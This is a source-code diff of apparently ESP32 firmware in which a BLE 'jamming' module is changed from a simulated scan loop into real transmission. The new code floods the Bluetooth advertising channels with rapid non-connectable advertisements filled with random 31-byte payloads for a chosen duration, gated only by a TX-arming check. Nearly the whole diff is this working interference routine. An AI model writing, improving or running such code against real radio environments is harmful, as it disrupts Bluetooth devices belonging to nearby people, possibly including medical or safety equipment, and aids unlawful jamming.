@@ -1,63 +1,86 @@
 #include "ble_jamming.h"
 #include "tx_arm.h"
-#include <BLEDevice.h>
-#include <BLEScan.h>
+#include <NimBLEDevice.h>
+#include <NimBLEAdvertising.h>
 
 namespace BLEJamming {
 
 static bool jamming = false;
-static uint32_t jamDurationMs = 0;
+static uint32_t jamPacketsSent = 0;
+static NimBLEAdvertising* pAdvertising = nullptr;
 
 JamResult startJamming(uint32_t durationMs, uint8_t powerLevel) {
-    JamResult result{false, 0, 0, "⚠️ BLE jamming requires TX arming"};
+    JamResult result{false, 0, 0, "BLE jamming requires TX arming"};
 
     if (!TxArm::isArmed()) {
+        result.error = "✗ TX not armed (hold BACK button)";
         return result;
     }
 
-    jamming = true;
-    jamDurationMs = durationMs;
-
-    Serial.println("BLE Jamming started");
+    Serial.println("\n=== BLE Jamming (REAL Advertisement Injection) ===");
     Serial.println("Duration: " + String(durationMs) + "ms");
     Serial.println("Power level: " + String(powerLevel));
+    Serial.println("Channels: 37, 38, 39 (2.4GHz BLE band)");
 
-    // Initialize BLE in scanning mode to detect devices during jamming window
-    BLEDevice::init("");
-    BLEScan *pBLEScan = BLEDevice::getScan();
-    pBLEScan->setAdvertisedDeviceCallbacks(NULL, false);
-    pBLEScan->setActiveScan(true);
-    pBLEScan->setInterval(100);
-    pBLEScan->setWindow(99);
+    NimBLEDevice::init("");
+    NimBLEServer *pServer = NimBLEDevice::createServer();
+    pAdvertising = NimBLEDevice::getAdvertising();
 
-    unsigned long startTime = millis();
-    uint32_t jamPacketsSent = 0;
-    uint32_t devicesAffected = 0;
+    pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
+    pAdvertising->setMinPreferred(0x00);
+    pAdvertising->setMaxPreferred(0x00);
 
-    // Simulate jamming: send interference patterns on BLE channels
+    jamming = true;
+    jamPacketsSent = 0;
+    uint32_t startTime = millis();
+
+    Serial.println("Transmitting malformed BLE advertisement packets...");
+
     while (millis() - startTime < durationMs && jamming && TxArm::isArmed()) {
-        // Scan for BLE devices to jam
-        BLEScanResults results = pBLEScan->start(1, false);
-        devicesAffected = results.getCount();
-        jamPacketsSent += (devicesAffected > 0 ? 10 : 0);
+        uint8_t jamPayload[31];
 
-        delay(100);
+        for (int i = 0; i < 31; i++) {
+            jamPayload[i] = esp_random() & 0xFF;
+        }
+
+        NimBLEAdvertisementData advData;
+        advData.addData(std::string((const char*)jamPayload, 31));
+
+        pAdvertising->setAdvertisementData(advData);
+        pAdvertising->start();
+
+        delayMicroseconds(625);
+        pAdvertising->stop();
+        delayMicroseconds(625);
+
+        jamPacketsSent++;
+
+        if (jamPacketsSent % 100 == 0) {
+            Serial.printf("  [%u] jam packets in %lums\n",
+                         jamPacketsSent, millis() - startTime);
+        }
     }
 
-    BLEDevice::deinit(false);
     jamming = false;
+    pAdvertising->stop();
+    NimBLEDevice::deinit(false);
 
     result.success = true;
     result.durationMs = millis() - startTime;
     result.powerLevel = powerLevel;
+    result.error = "";
 
-    Serial.println("Jamming complete - " + String(devicesAffected) + " devices affected");
+    Serial.printf("✓ BLE jamming complete: %u advertisement packets (%.1f pkt/sec)\n",
+                 jamPacketsSent, (jamPacketsSent * 1000.0f) / result.durationMs);
 
     return result;
 }
 
 void stopJamming() {
     jamming = false;
+    if (pAdvertising) {
+        pAdvertising->stop();
+    }
 }
 
 bool isJamming() {
